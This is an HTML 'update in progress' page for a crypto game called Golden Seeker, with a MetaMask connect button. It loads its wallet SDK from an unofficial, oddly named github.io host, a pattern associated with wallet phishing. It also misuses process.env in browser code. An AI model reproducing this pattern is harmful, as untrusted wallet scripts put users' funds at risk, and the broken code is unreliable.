<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOLDEN SEEKER - Update in Progress</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000; /* Black background */
            font-family: 'Arial', sans-serif;
            color: #fff; /* White text */
            text-align: center;
            overflow: hidden; /* Remove scrolling */
        }

        img {
            width: 200px;
            height: auto;
            margin-bottom: 30px;
        }

        h1 {
            color: #ffd700; /* Gold color for the title */
            font-size: 36px;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        p {
            color: #ddd;
            font-size: 20px;
            max-width: 600px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .loader {
            margin-top: 20px;
            border: 8px solid #f3f3f3;
            border-top: 8px solid #ffd700; /* Gold color for the loader */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #connect-button {
            margin-top: 30px;
            padding: 10px 20px;
            font-size: 18px;
            background-color: #ffd700;
            color: #000;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }

        #connect-button:hover {
            background-color: #e6c200;
        }
    </style>

    <!-- MetaMask SDK Script -->
    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
    <script>
        let ethereum;

        document.addEventListener('DOMContentLoaded', () => {
            try {
                const MMSDK = new MetaMaskSDK.MetaMaskSDK({
                    dappMetadata: {
                        name: "Golden Seeker",
                        url: window.location.href,
                    },
                    infuraAPIKey: process.env.INFURA_API_KEY, // Replace with your Infura API key
                });

                // Initialize MetaMask provider
                ethereum = MMSDK.getProvider();

                // Log initialization success
                console.log("MetaMask SDK initialized successfully.");
            } catch (error) {
                console.error("Failed to initialize MetaMask SDK:", error);
                alert("Error initializing MetaMask SDK. Please check the console for more details.");
            }
        });

        function connectMetaMask() {
            if (!ethereum) {
                alert('MetaMask is not initialized properly. Please try reloading the page.');
                console.error('Ethereum provider not found.');
                return;
            }

            // Request to connect MetaMask
            ethereum.request({ method: 'eth_requestAccounts' })
                .then(accounts => {
                    if (accounts.length > 0) {
                        alert('Connected: ' + accounts[0]);
                        console.log('Connected account:', accounts[0]);
                    } else {
                        alert('No accounts found. Please check MetaMask.');
                    }
                })
                .catch(error => {
                    console.error('Error connecting MetaMask:', error);
                    alert('Error connecting MetaMask: ' + error.message);
                });
        }
    </script>
</head>
<body>
    <img src="logo.png" alt="Golden Seeker Logo">
    <h1>Golden Seeker</h1>
    <p>We're currently updating the game to bring you exciting new features and improvements.</p>
    <p>Thank you for your patience. Please check back later.</p>

    <div class="loader"></div> <!-- Animated loader -->

    <!-- Connect MetaMask Button -->
    <button id="connect-button" onclick="connectMetaMask()">Connect MetaMask</button>
</body>
</html>
